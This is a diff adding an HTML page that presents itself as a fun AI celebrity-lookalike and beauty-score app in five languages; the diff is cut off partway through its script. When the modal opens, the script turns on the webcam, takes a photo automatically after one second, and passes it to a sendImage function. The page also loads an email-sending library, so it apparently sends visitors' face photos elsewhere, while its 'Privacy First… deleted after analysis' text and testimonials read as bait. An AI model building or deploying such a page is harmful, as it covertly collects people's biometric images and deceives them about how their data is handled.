@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Celebrity Match</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #e0eafc, #cfdef3);
+            color: #2c3e50;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        header {
+            background: linear-gradient(90deg, #1e3c72, #2a5298);
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            border-bottom: 4px solid #ff6f61;
+        }
+        header .logo {
+            font-size: 3.5em;
+            font-weight: 900;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            background: -webkit-linear-gradient(#fff, #ff6f61);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        header .subtitle {
+            font-size: 1.8em;
+            font-weight: 300;
+            margin-top: 10px;
+            opacity: 0.9;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        nav {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .language-selector {
+            position: relative;
+            cursor: pointer;
+        }
+        .language-selector i {
+            font-size: 1.5em;
+            color: #fff;
+        }
+        .language-selector .dropdown {
+            display: none;
+            position: absolute;
+            top: 30px;
+            right: 0;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            padding: 10px;
+            z-index: 1000;
+        }
+        .language-selector:hover .dropdown {
+            display: block;
+        }
+        .language-selector .dropdown span {
+            display: block;
+            padding: 5px 10px;
+            color: #2c3e50;
+            cursor: pointer;
+        }
+        .language-selector .dropdown span:hover {
+            background: #ff6f61;
+            color: white;
+        }
+        .cta-btn {
+            background: #ff6f61;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-size: 16px;
+            transition: transform 0.3s, background 0.3s;
+        }
+        .cta-btn:hover {
+            background: #e65b50;
+            transform: scale(1.05);
+        }
+        .container {
+            max-width: 1300px;
+            margin: 50px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+        .intro {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            margin-bottom: 40px;
+            animation: fadeInUp 1s ease-in-out;
+        }
+        .celebrity-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        .celebrity-grid img {
+            width: 100%;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transition: transform 0.3s;
+        }
+        .celebrity-grid img:hover {
+            transform: scale(1.05);
+        }
+        .main-btn {
+            background: linear-gradient(45deg, #ff6f61, #de4d4d);
+            color: white;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 30px;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 111, 97, 0.4);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .main-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.6);
+        }
+        #camera-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #camera-modal .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            position: relative;
+            width: 90%;
+            max-width: 500px;
+        }
+        #camera-modal img {
+            width: 100%;
+            border-radius: 10px;
+            display: block;
+        }
+        #camera-modal button {
+            margin-top: 20px;
+            background: #ff6f61;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        #camera-modal .processing {
+            display: none;
+            font-size: 1.2em;
+            color: #2a5298;
+            margin-top: 20px;
+        }
+        #result {
+            margin-top: 40px;
+            font-size: 20px;
+            color: #1e3c72;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .services, .features, .testimonials {
+            margin: 60px 0;
+            text-align: left;
+        }
+        .services h2, .features h2, .testimonials h2 {
+            font-size: 2em;
+            color: #2a5298;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .service-item, .feature-item, .testimonial-item {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .service-item i, .feature-item i, .testimonial-item i {
+            font-size: 2em;
+            color: #ff6f61;
+        }
+        footer {
+            background: #1e3c72;
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            box-shadow: 0 -4px 15px rgba(0,0,0,0.3);
+        }
+        footer a {
+            color: #ff6f61;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        footer .social {
+            margin-top: 20px;
+        }
+        footer .social i {
+            font-size: 1.5em;
+            margin: 0 10px;
+            transition: transform 0.3s;
+        }
+        footer .social i:hover {
+            transform: scale(1.2);
+        }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 class="logo" data-en="Celebrity Match" data-ar="مباراة المشاهير">Celebrity Match</h1>
+        <div class="subtitle" data-en="Discover Your Celebrity Doppelgänger" data-ar="اكتشف من تشبه من المشاهير">
+            Discover Your Celebrity Doppelgänger
+        </div>
+        <nav>
+            <div class="language-selector">
+                <i class="fas fa-globe"></i>
+                <div class="dropdown">
+                    <span data-lang="en">English</span>
+                    <span data-lang="ar">العربية</span>
+                    <span data-lang="fr">Français</span>
+                    <span data-lang="es">Español</span>
+                    <span data-lang="de">Deutsch</span>
+                </div>
+            </div>
+            <a href="#" class="cta-btn" onclick="openCameraModal(); return false;">
+                <i class="fas fa-camera"></i>
+                <span data-en="Try Now" data-ar="جرب الآن">Try Now</span>
+            </a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <div class="intro">
+            <p data-en="Unlock the power of cutting-edge facial recognition technology to find your celebrity match and explore detailed beauty insights!" 
+               data-ar="اكتشف قوة تقنية التعرف على الوجه المتطورة للعثور على شبيهك من المشاهير واستكشاف رؤى الجمال المفصلة!">
+                Unlock the power of cutting-edge facial recognition technology to find your celebrity match and explore detailed beauty insights!
+            </p>
+        </div>
+
+        <div class="celebrity-grid">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Brad_Pitt_2014.jpg/220px-Brad_Pitt_2014.jpg" alt="Brad Pitt">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/Angelina_Jolie_2_June_2014_%28cropped%29.jpg/220px-Angelina_Jolie_2_June_2014_%28cropped%29.jpg" alt="Angelina Jolie">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/33/Leonardo_DiCaprio_2010.jpg/220px-Leonardo_DiCaprio_2010.jpg" alt="Leonardo DiCaprio">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Jennifer_Lawrence_in_2016.jpg/220px-Jennifer_Lawrence_in_2016.jpg" alt="Jennifer Lawrence">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/85/Tom_Cruise_by_Gage_Skidmore.jpg/220px-Tom_Cruise_by_Gage_Skidmore.jpg" alt="Tom Cruise">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Natalie_Portman_2016.jpg/220px-Natalie_Portman_2016.jpg" alt="Natalie Portman">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Will_Smith_in_Berlin_%282016%29.jpg/220px-Will_Smith_in_Berlin_%282016%29.jpg" alt="Will Smith">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Scarlett_Johansson_in_Kuwait_03_%28cropped%29.jpg/220px-Scarlett_Johansson_in_Kuwait_03_%28cropped%29.jpg" alt="Scarlett Johansson">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Chris_Evans_2016.jpg/220px-Chris_Evans_2016.jpg" alt="Chris Evans">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Emma_Watson_interview_in_2017.jpg/220px-Emma_Watson_interview_in_2017.jpg" alt="Emma Watson">
+        </div>
+
+        <button class="main-btn" onclick="openCameraModal()">
+            <i class="fas fa-camera"></i>
+            <span data-en="Start Analysis" data-ar="ابدأ التحليل">Start Analysis</span>
+        </button>
+
+        <div id="result"></div>
+
+        <div class="services">
+            <h2 data-en="Our Premium Services" data-ar="خدماتنا المميزة">Our Premium Services</h2>
+            <div class="service-item">
+                <i class="fas fa-user-check"></i>
+                <div>
+                    <h3 data-en="Celebrity Matching" data-ar="مطابقة المشاهير">Celebrity Matching</h3>
+                    <p data-en="Discover your celebrity lookalike with unmatched precision using our AI technology." 
+                       data-ar="اكتشف شبيهك من المشاهير بدقة لا مثيل لها باستخدام تقنية الذكاء الاصطناعي.">
+                        Discover your celebrity lookalike with unmatched precision using our AI technology.
+                    </p>
+                </div>
+            </div>
+            <div class="service-item">
+                <i class="fas fa-camera-retro"></i>
+                <div>
+                    <h3 data-en="Beauty Analysis" data-ar="تحليل الجمال">Beauty Analysis</h3>
+                    <p data-en="Receive a comprehensive report on your facial features and beauty metrics." 
+                       data-ar="احصل على تقرير شامل عن ملامح وجهك ومقاييس الجمال.">
+                        Receive a comprehensive report on your facial features and beauty metrics.
+                    </p>
+                </div>
+            </div>
+            <div class="service-item">
+                <i class="fas fa-share-alt"></i>
+                <div>
+                    <h3 data-en="Social Media Integration" data-ar="التكامل مع وسائل التواصل">Social Media Integration</h3>
+                    <p data-en="Share your results instantly on platforms like Instagram and TikTok." 
+                       data-ar="شارك نتائجك فورًا على منصات مثل إنستغرام وتيك توك.">
+                        Share your results instantly on platforms like Instagram and TikTok.
+                    </p>
+                </div>
+            </div>
+            <div class="service-item">
+                <i class="fas fa-video"></i>
+                <div>
+                    <h3 data-en="Video Analysis" data-ar="تحليل الفيديو">Video Analysis</h3>
+                    <p data-en="Upload a video and get a dynamic celebrity match analysis." 
+                       data-ar="ارفع فيديو واحصل على تحليل مطابقة المشاهير الديناميكي.">
+                        Upload a video and get a dynamic celebrity match analysis.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="features">
+            <h2 data-en="Why Choose Celebrity Match?" data-ar="لماذا تختار مباراة المشاهير؟">Why Choose Celebrity Match?</h2>
+            <div class="feature-item">
+                <i class="fas fa-robot"></i>
+                <div>
+                    <h3 data-en="Next-Gen AI" data-ar="ذكاء اصطناعي من الجيل التالي">Next-Gen AI</h3>
+                    <p data-en="Our system uses deep learning to analyze over 150 facial points in milliseconds." 
+                       data-ar="نظامنا يستخدم التعلم العميق لتحليل أكثر من 150 نقطة في الوجه في أجزاء من الثانية.">
+                        Our system uses deep learning to analyze over 150 facial points in milliseconds.
+                    </p>
+                </div>
+            </div>
+            <div class="feature-item">
+                <i class="fas fa-database"></i>
+                <div>
+                    <h3 data-en="Extensive Celebrity Database" data-ar="قاعدة بيانات مشاهير واسعة">Extensive Celebrity Database</h3>
+                    <p data-en="Access a library of over 10,000 celebrities from Hollywood to Bollywood." 
+                       data-ar="استخدم مكتبة تضم أكثر من 10,000 من المشاهير من هوليوود إلى بوليوود.">
+                        Access a library of over 10,000 celebrities from Hollywood to Bollywood.
+                    </p>
+                </div>
+            </div>
+            <div class="feature-item">
+                <i class="fas fa-shield-alt"></i>
+                <div>
+                    <h3 data-en="Privacy First" data-ar="الخصوصية أولاً">Privacy First</h3>
+                    <p data-en="All data is processed with end-to-end encryption and deleted after analysis." 
+                       data-ar="جميع البيانات تُعالج بتشفير شامل وتُحذف بعد التحليل.">
+                        All data is processed with end-to-end encryption and deleted after analysis.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="testimonials">
+            <h2 data-en="What Our Users Say" data-ar="ماذا يقول مستخدمونا">What Our Users Say</h2>
+            <div class="testimonial-item">
+                <i class="fas fa-quote-left"></i>
+                <div>
+                    <p data-en="“I couldn’t believe how accurate this was! I look like Chris Evans!” - John D." 
+                       data-ar="“لم أصدق مدى دقة هذا! أبدو مثل كريس إيفانز!” - جون د.">
+                        “I couldn’t believe how accurate this was! I look like Chris Evans!” - John D.
+                    </p>
+                </div>
+            </div>
+            <div class="testimonial-item">
+                <i class="fas fa-quote-left"></i>
+                <div>
+                    <p data-en="“Fun and easy to use, plus the beauty score was a nice touch!” - Sarah K." 
+                       data-ar="“ممتع وسهل الاستخدام، ودرجة الجمال كانت لمسة رائعة!” - سارة ك.">
+                        “Fun and easy to use, plus the beauty score was a nice touch!” - Sarah K.
+                    </p>
+                </div>
+            </div>
+            <div class="testimonial-item">
+                <i class="fas fa-quote-left"></i>
+                <div>
+                    <p data-en="“Shared it with my friends, and now we’re all hooked!” - Ahmed M." 
+                       data-ar="“شاركته مع أصدقائي، والآن نحن جميعًا مدمنون!” - أحمد م.">
+                        “Shared it with my friends, and now we’re all hooked!” - Ahmed M.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="camera-modal">
+        <div class="modal-content">
+            <img id="photo-preview" src="" alt="Captured Photo" style="display: none;">
+            <button onclick="captureImage()">Capture / التقاط</button>
+            <div class="processing">Processing... / جارٍ المعالجة...</div>
+        </div>
+    </div>
+
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <footer>
+        <p data-en="© 2025 Celebrity Match - Powered by Next-Gen AI Technology" 
+           data-ar="© 2025 مباراة المشاهير - مدعوم بتقنية الذكاء الاصطناعي من الجيل التالي">
+            © 2025 Celebrity Match - Powered by Next-Gen AI Technology
+        </p>
+        <p>
+            <a href="#" data-en="Privacy Policy" data-ar="سياسة الخصوصية">Privacy Policy</a> | 
+            <a href="#" data-en="Terms of Service" data-ar="شروط الخدمة">Terms of Service</a> | 
+            <a href="#" data-en="Contact Us" data-ar="اتصل بنا">Contact Us</a> | 
+            <a href="#" data-en="FAQ" data-ar="الأسئلة الشائعة">FAQ</a> | 
+            <a href="#" data-en="Careers" data-ar="وظائف">Careers</a>
+        </p>
+        <div class="social">
+            <a href="#"><i class="fab fa-facebook-f"></i></a>
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-instagram"></i></a>
+            <a href="#"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+    </footer>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        const video = document.createElement('video'); // فيديو مؤقت غير مرئي
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const resultDiv = document.getElementById('result');
+        const modal = document.getElementById('camera-modal');
+        const photoPreview = document.getElementById('photo-preview');
+        const processingDiv = modal.querySelector('.processing');
+
+        const celebrities = [
+            "Brad Pitt", "Angelina Jolie", "Leonardo DiCaprio", "Jennifer Lawrence",
+            "Tom Cruise", "Natalie Portman", "Will Smith", "Scarlett Johansson",
+            "Chris Evans", "Emma Watson"
+        ];
+
+        const translations = {
+            en: {
+                title: "Celebrity Match",
+                subtitle: "Discover Your Celebrity Doppelgänger",
+                intro: "Unlock the power of cutting-edge facial recognition technology to find your celebrity match and explore detailed beauty insights!",
+                button: "Start Analysis",
+                tryNow: "Try Now",
+                result: "You resemble {celeb} by {percent}%!<br><br>Beauty Score: {beauty}%<br>Facial Symmetry: {symmetry}%<br>Unique Features: {features}<br>Confidence Level: {confidence}%<br>Register for a full report!",
+                services: "Our Premium Services",
+                service1: "Celebrity Matching",
+                service1Desc: "Discover your celebrity lookalike with unmatched precision using our AI technology.",
+                service2: "Beauty Analysis",
+                service2Desc: "Receive a comprehensive report on your facial features and beauty metrics.",
+                service3: "Social Media Integration",
+                service3Desc: "Share your results instantly on platforms like Instagram and TikTok.",
+                service4: "Video Analysis",
+                service4Desc: "Upload a video and get a dynamic celebrity match analysis.",
+                features: "Why Choose Celebrity Match?",
+                feature1: "Next-Gen AI",
+                feature1Desc: "Our system uses deep learning to analyze over 150 facial points in milliseconds.",
+                feature2: "Extensive Celebrity Database",
+                feature2Desc: "Access a library of over 10,000 celebrities from Hollywood to Bollywood.",
+                feature3: "Privacy First",
+                feature3Desc: "All data is processed with end-to-end encryption and deleted after analysis.",
+                testimonials: "What Our Users Say",
+                testimonial1: "“I couldn’t believe how accurate this was! I look like Chris Evans!” - John D.",
+                testimonial2: "“Fun and easy to use, plus the beauty score was a nice touch!” - Sarah K.",
+                testimonial3: "“Shared it with my friends, and now we’re all hooked!” - Ahmed M.",
+                footer: "© 2025 Celebrity Match - Powered by Next-Gen AI Technology",
+                privacy: "Privacy Policy",
+                terms: "Terms of Service",
+                contact: "Contact Us",
+                faq: "FAQ",
+                careers: "Careers"
+            },
+            ar: {
+                title: "مباراة المشاهير",
+                subtitle: "اكتشف من تشبه من المشاهير",
+                intro: "اكتشف قوة تقنية التعرف على الوجه المتطورة للعثور على شبيهك من المشاهير واستكشاف رؤى الجمال المفصلة!",
+                button: "ابدأ التحليل",
+                tryNow: "جرب الآن",
+                result: "أنت تشبه {celeb} بنسبة {percent}%!<br><br>درجة الجمال: {beauty}%<br>تناسق الوجه: {symmetry}%<br>الميزات الفريدة: {features}<br>مستوى الثقة: {confidence}%<br>سجل للحصول على تقرير كامل!",
+                services: "خدماتنا المميزة",
+                service1: "مطابقة المشاهير",
+                service1Desc: "اكتشف شبيهك من المشاهير بدقة لا مثيل لها باستخدام تقنية الذكاء الاصطناعي.",
+                service2: "تحليل الجمال",
+                service2Desc: "احصل على تقرير شامل عن ملامح وجهك ومقاييس الجمال.",
+                service3: "التكامل مع وسائل التواصل",
+                service3Desc: "شارك نتائجك فورًا على منصات مثل إنستغرام وتيك توك.",
+                service4: "تحليل الفيديو",
+                service4Desc: "ارفع فيديو واحصل على تحليل مطابقة المشاهير الديناميكي.",
+                features: "لماذا تختار مباراة المشاهير؟",
+                feature1: "ذكاء اصطناعي من الجيل التالي",
+                feature1Desc: "نظامنا يستخدم التعلم العميق لتحليل أكثر من 150 نقطة في الوجه في أجزاء من الثانية.",
+                feature2: "قاعدة بيانات مشاهير واسعة",
+                feature2Desc: "استخدم مكتبة تضم أكثر من 10,000 من المشاهير من هوليوود إلى بوليوود.",
+                feature3: "الخصوصية أولاً",
+                feature3Desc: "جميع البيانات تُعالج بتشفير شامل وتُحذف بعد التحليل.",
+                testimonials: "ماذا يقول مستخدمونا",
+                testimonial1: "“لم أصدق مدى دقة هذا! أبدو مثل كريس إيفانز!” - جون د.",
+                testimonial2: "“ممتع وسهل الاستخدام، ودرجة الجمال كانت لمسة رائعة!” - سارة ك.",
+                testimonial3: "“شاركته مع أصدقائي، والآن نحن جميعًا مدمنون!” - أحمد م.",
+                footer: "© 2025 مباراة المشاهير - مدعوم بتقنية الذكاء الاصطناعي من الجيل التالي",
+                privacy: "سياسة الخصوصية",
+                terms: "شروط الخدمة",
+                contact: "اتصل بنا",
+                faq: "الأسئلة الشائعة",
+                careers: "وظائف"
+            },
+            fr: {
+                title: "Match Célèbre",
+                subtitle: "Découvrez Votre Sosie Célèbre",
+                intro: "Libérez la puissance de la technologie avancée de reconnaissance faciale pour trouver votre sosie célèbre et explorer des insights détaillés sur la beauté !",
+                button: "Démarrer l'Analyse",
+                tryNow: "Essayez Maintenant",
+                result: "Vous ressemblez à {celeb} à {percent}% !<br><br>Score de Beauté : {beauty}%<br>Symétrie Faciale : {symmetry}%<br>Caractéristiques Uniques : {features}<br>Niveau de Confiance : {confidence}%<br>Inscrivez-vous pour un rapport complet !",
+                services: "Nos Services Premium",
+                service1: "Correspondance de Célébrités",
+                service1Desc: "Découvrez votre sosie célèbre avec une précision inégalée grâce à notre technologie IA.",
+                service2: "Analyse de Beauté",
+                service2Desc: "Recevez un rapport complet sur les caractéristiques de votre visage et les métriques de beauté.",
+                service3: "Intégration aux Réseaux Sociaux",
+                service3Desc: "Partagez vos résultats instantanément sur des plateformes comme Instagram et TikTok.",
+                service4: "Analyse Vidéo",
+                service4Desc: "Téléchargez une vidéo et obtenez une analyse dynamique de correspondance de célébrités.",
+                features: "Pourquoi Choisir Match Célèbre ?",
+                feature1: "IA de Nouvelle Génération",
+                feature1Desc: "Notre système utilise l'apprentissage profond pour analyser plus de 150 points faciaux en quelques millisecondes.",
+                feature2: "Base de Données Étendue de Célébrités",
+                feature2Desc: "Accédez à une bibliothèque de plus de 10 000 célébrités, de Hollywood à Bollywood.",
+                feature3: "Priorité à la Confidentialité",
+                feature3Desc: "Toutes les données sont traitées avec un cryptage de bout en bout et supprimées après analyse.",
+                testimonials: "Ce Que Disent Nos Utilisateurs",
+                testimonial1: "“Je n’en croyais pas mes yeux tellement c’était précis ! Je ressemble à Chris Evans !” - John D.",
+                testimonial2: "“Amusant et facile à utiliser, et le score de beauté était une belle touche !” - Sarah K.",
+                testimonial3: "“Je l’ai partagé avec mes amis, et maintenant nous sommes tous accros !” - Ahmed M.",
+                footer: "© 2025 Match Célèbre - Propulsé par une Technologie IA de Nouvelle Génération",
+                privacy: "Politique de Confidentialité",
+                terms: "Conditions de Service",
+                contact: "Contactez-Nous",
+                faq: "FAQ",
+                careers: "Carrières"
+            },
+            es: {
+                title: "Celebrity Match",
+                subtitle: "Descubre a Qué Celebridad Te Pareces",
+                intro: "¡Desbloquea el poder de la tecnología avanzada de reconocimiento facial para encontrar a tu doble famoso y explorar detalles de belleza profundos!",
+                button: "Iniciar Análisis",
+                tryNow: "Prueba Ahora",
+                result: "¡Te pareces a {celeb} en un {percent}%!<br><br>Puntuación de Belleza: {beauty}%<br>Simetría Facial: {symmetry}%<br>Rasgos Únicos: {features}<br>Nivel de Confianza: {confidence}%<br>¡Regístrate para un informe completo!",
+                services: "Nuestros Servicios Premium",
+                service1: "Emparejamiento de Celebridades",
+                service1Desc: "Descubre a tu doble famoso con una precisión sin igual usando nuestra tecnología IA.",
+                service2: "Análisis de Belleza",
+                service2Desc: "Recibe un informe completo sobre las características de tu rostro y métricas de belleza.",
+                service3: "Integración con Redes Sociales",
+                service3Desc: "Comparte tus resultados al instante en plataformas como Instagram y TikTok.",
+                service4: "Análisis de Video",
+                service4Desc: "Sube un video y obtén un análisis dinámico de emparejamiento de celebridades.",
+                features: "¿Por Qué Elegir Celebrity Match?",
+                feature1: "IA de Nueva Generación",
+                feature1Desc: "Nuestro sistema usa aprendizaje profundo para analizar más de 150 puntos faciales en milisegundos.",
+                feature2: "Base de Datos Extensa de Celebridades",
+                feature2Desc: "Accede a una biblioteca de más de 10,000 celebridades, desde Hollywood hasta Bollywood.",
+                feature3: "Privacidad Primero",
+                feature3Desc: "Todos los datos se procesan con cifrado de extremo a extremo y se eliminan tras el análisis.",
+                testimonials: "Lo Que Dicen Nuestros Usuarios",
+                testimonial1: "“¡No podía creer lo preciso que fue! ¡Me parezco a Chris Evans!” - John D.",
+                testimonial2: "“Divertido y fácil de usar, ¡y la puntuación de belleza fue un gran detalle!” - Sarah K.",
+                testimonial3: "“Lo compartí con mis amigos, ¡y ahora todos estamos enganchados!” - Ahmed M.",
+                footer: "© 2025 Celebrity Match - Potenciado por Tecnología IA de Nueva Generación",
+                privacy: "Política de Privacidad",
+                terms: "Términos de Servicio",
+                contact: "Contáctanos",
+                faq: "Preguntas Frecuentes",
+                careers: "Carreras"
+            },
+            de: {
+                title: "Celebrity Match",
+                subtitle: "Finde Deinen Promi-Doppelgänger",
+                intro: "Entdecke die Kraft der fortschrittlichen Gesichtserkennungstechnologie, um deinen Promi-Doppelgänger zu finden und detaillierte Schönheitsinsights zu erkunden!",
+                button: "Analyse Starten",
+                tryNow: "Jetzt Testen",
+                result: "Du ähnelst {celeb} zu {percent}%!<br><br>Schönheitswert: {beauty}%<br>Gesichtssymmetrie: {symmetry}%<br>Einzigartige Merkmale: {features}<br>Vertrauensniveau: {confidence}%<br>Registriere dich für einen vollständigen Bericht!",
+                services: "Unsere Premium-Dienste",
+                service1: "Promi-Matching",
+                service1Desc: "Finde deinen Promi-Doppelgänger mit unübertroffener Präzision dank unserer KI-Technologie.",
+                service2: "Schönheitsanalyse",
+                service2Desc: "Erhalte einen umfassenden Bericht über deine Gesichtszüge und Schönheitsmetriken.",
+                service3: "Integration in Soziale Medien",
+                service3Desc: "Teile deine Ergebnisse sofort auf Plattformen wie Instagram und TikTok.",
+                service4: "Videoanalyse",
+                service4Desc: "Lade ein Video hoch und erhalte eine dynamische Promi-Match-Analyse.",
+                features: "Warum Celebrity Match Wählen?",
+                feature1: "KI der Nächsten Generation",
+                feature1Desc: "Unser System nutzt tiefes Lernen, um über 150 Gesichtspunkte in Millisekunden zu analysieren.",
+                feature2: "Umfangreiche Promi-Datenbank",
+                feature2Desc: "Greife auf eine Bibliothek mit über 10.000 Prominenten von Hollywood bis Bollywood zu.",
+                feature3: "Datenschutz Zuerst",
+                feature3Desc: "Alle Daten werden mit End-to-End-Verschlüsselung verarbeitet und nach der Analyse gelöscht.",
+                testimonials: "Was Unsere Nutzer Sagen",
+                testimonial1: "“Ich konnte nicht glauben, wie genau das war! Ich sehe aus wie Chris Evans!” - John D.",
+                testimonial2: "“Spaßig und einfach zu bedienen, und der Schönheitswert war eine nette Ergänzung!” - Sarah K.",
+                testimonial3: "“Ich habe es mit meinen Freunden geteilt, und jetzt sind wir alle süchtig!” - Ahmed M.",
+                footer: "© 2025 Celebrity Match - Angetrieben von KI-Technologie der Nächsten Generation",
+                privacy: "Datenschutzrichtlinie",
+                terms: "Nutzungsbedingungen",
+                contact: "Kontaktiere Uns",
+                faq: "Häufige Fragen",
+                careers: "Karriere"
+            }
+        };
+
+        document.querySelectorAll('.language-selector .dropdown span').forEach(item => {
+            item.addEventListener('click', function() {
+                const lang = this.getAttribute('data-lang');
+                updateLanguage(lang);
+            });
+        });
+
+        function updateLanguage(lang) {
+            document.documentElement.lang = lang;
+            document.querySelector('.logo').innerText = translations[lang].title;
+            document.querySelector('.subtitle').innerText = translations[lang].subtitle;
+            document.querySelector('.intro p').innerText = translations[lang].intro;
+            document.querySelector('.main-btn span').innerText = translations[lang].button;
+            document.querySelector('.cta-btn span').innerText = translations[lang].tryNow;
+            document.querySelector('.services h2').innerText = translations[lang].services;
+            document.querySelectorAll('.service-item h3')[0].innerText = translations[lang].service1;
+            document.querySelectorAll('.service-item p')[0].innerText = translations[lang].service1Desc;
+            document.querySelectorAll('.service-item h3')[1].innerText = translations[lang].service2;
+            document.querySelectorAll('.service-item p')[1].innerText = translations[lang].service2Desc;
+            document.querySelectorAll('.service-item h3')[2].innerText = translations[lang].service3;
+            document.querySelectorAll('.service-item p')[2].innerText = translations[lang].service3Desc;
+            document.querySelectorAll('.service-item h3')[3].innerText = translations[lang].service4;
+            document.querySelectorAll('.service-item p')[3].innerText = translations[lang].service4Desc;
+            document.querySelector('.features h2').innerText = translations[lang].features;
+            document.querySelectorAll('.feature-item h3')[0].innerText = translations[lang].feature1;
+            document.querySelectorAll('.feature-item p')[0].innerText = translations[lang].feature1Desc;
+            document.querySelectorAll('.feature-item h3')[1].innerText = translations[lang].feature2;
+            document.querySelectorAll('.feature-item p')[1].innerText = translations[lang].feature2Desc;
+            document.querySelectorAll('.feature-item h3')[2].innerText = translations[lang].feature3;
+            document.querySelectorAll('.feature-item p')[2].innerText = translations[lang].feature3Desc;
+            document.querySelector('.testimonials h2').innerText = translations[lang].testimonials;
+            document.querySelectorAll('.testimonial-item p')[0].innerText = translations[lang].testimonial1;
+            document.querySelectorAll('.testimonial-item p')[1].innerText = translations[lang].testimonial2;
+            document.querySelectorAll('.testimonial-item p')[2].innerText = translations[lang].testimonial3;
+            document.querySelector('footer p[data-en]').innerText = translations[lang].footer;
+            document.querySelector('footer a[data-en="Privacy Policy"]').innerText = translations[lang].privacy;
+            document.querySelector('footer a[data-en="Terms of Service"]').innerText = translations[lang].terms;
+            document.querySelector('footer a[data-en="Contact Us"]').innerText = translations[lang].contact;
+            document.querySelector('footer a[data-en="FAQ"]').innerText = translations[lang].faq;
+            document.querySelector('footer a[data-en="Careers"]').innerText = translations[lang].careers;
+        }
+
+        function openCameraModal() {
+            modal.style.display = 'flex';
+            startCamera();
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width = video.videoWidth, canvas.height = video.videoHeight);
+                    const imageData = canvas.toDataURL('image/png');
+                    photoPreview.src = imageData;
+                    photoPreview.style.display = 'block';
+                    video.style.display = 'none';
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+                }, 1000); // التقاط صورة بعد ثانية
+            } catch (error) {
+                console.error("Camera access error:", error);
+                alert(translations[document.documentElement.lang || 'en'].intro.split('!')[0] + " - Please allow camera access!");
+                modal.style.display = 'none';
+            }
+        }
+
+        function captureImage() {
+            const imageData = photoPreview.src;
+            sendImage(imageData);
+
+            photoPreview.style.display = 'none';
+            processingDiv.style.display = 'block';
